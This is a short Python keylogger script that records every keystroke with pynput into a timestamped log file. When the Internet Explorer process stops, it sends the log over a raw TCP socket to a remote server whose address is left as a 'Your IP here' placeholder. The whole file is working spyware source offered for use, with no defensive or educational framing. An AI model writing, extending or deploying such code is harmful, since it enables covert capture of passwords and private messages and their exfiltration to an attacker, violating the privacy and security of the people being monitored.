from pynput.keyboard import Key, Listener
import logging
import psutil
import socket
######## logger / client which sends log to server ########
log_dir = ""

logging.basicConfig(filename=(log_dir + "log.txt"), level=logging.DEBUG, format= '%(asctime)s: %(message)s:')

def send_keylog (): #sending the keylog
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = "Your IP here"
    port = 8080
    s.connect((host, port))

    filename = "log.txt"
    file = open (filename, 'rb') #read as binary
    file_data = file.read (1024*1024) #size 1MB
    s.send (file_data)

def on_press (key): #logging if a key is pressed
    if "iexplore.exe" not in (p.name() for p in psutil.process_iter()):  #if iexplore.exe process stops -> quit
        send_keylog()
        return False
    
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
